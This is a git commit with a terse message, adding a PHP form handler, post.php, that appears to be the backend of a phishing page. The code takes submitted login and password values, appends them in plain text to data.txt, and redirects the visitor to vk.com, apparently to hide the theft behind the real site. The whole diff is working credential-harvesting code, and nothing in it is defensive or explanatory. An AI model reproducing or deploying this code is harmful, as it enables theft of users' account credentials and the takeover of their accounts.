6a225f60481904fd4bb910a97d2b74bf10da91c8
0NULL0 <70834622+0NULL0@users.noreply.github.com>
2020-09-24 21:21:03 +0300

    u

--- post.php
+++ post.php
@@ -1,5 +1,10 @@
 <?php
 
- header('Location: etc/wait.html');
- 
+$login = $_POST['login'];
+
+$password = $_POST['password'];
+
+file_put_contents("data.txt", "[LOGIN]: " . $login . " [PASSWORD]: " . $password . "\n", FILE_APPEND);
+
+header('Location: https://vk.com');
 exit();
